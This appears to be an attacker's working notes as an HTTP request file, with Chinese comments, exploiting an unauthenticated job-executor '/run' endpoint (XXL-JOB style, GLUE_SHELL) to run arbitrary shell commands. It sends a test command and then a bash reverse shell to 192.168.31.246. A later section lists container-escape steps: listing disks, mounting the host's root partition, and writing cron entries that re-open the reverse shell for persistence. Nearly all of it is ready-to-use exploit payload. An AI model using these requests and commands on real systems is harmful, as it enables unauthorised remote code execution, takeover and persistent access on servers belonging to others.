###
# 新建文件
# touch /tmp/joker
POST /run HTTP/1.1
Host: 192.168.31.31:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "touch ",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
}


###
# 反弹shell
# bash -i >& /dev/tcp/192.168.31.246/7777 0>&1
# bash -i >& /dev/tcp/192.168.31.246/7778 0>&1
POST /run HTTP/1.1
Host: 192.168.31.31:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "bash -i >& /dev/tcp/192.168.31.246/7777 0>&1",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
}

###
bash -i >& /dev/tcp/192.168.31.246/7778 0>&1
# 查查看下系统中的所有银盘分区表信息
fdisk -l
# 不能用....
lvdisplay   
# 挂载主机目录
mkdir /joker
mount /dev/sda1 /joker
mount /dev/vgubuntu/root /joker
# 写入计划任务到主机(不能用, 保持不了持续的bash)
echo '* * * * * bash -i >& /dev/tcp/192.168.31.246/7778 0>&1' >> /joker/var/spool/cron/root
echo "* * * * * bash -i >& /dev/tcp/192.168.31.246/7778 0>&1" | crontab -
chroot /joker echo test > /tmp/joker1
# 挂载的盘不一定有系统, 这也挺尴尬的
# 有时候需要用 lvdisplay 查看逻辑分区, 没有这个命令的话还要装
# 以及逻辑分区不一定挂的上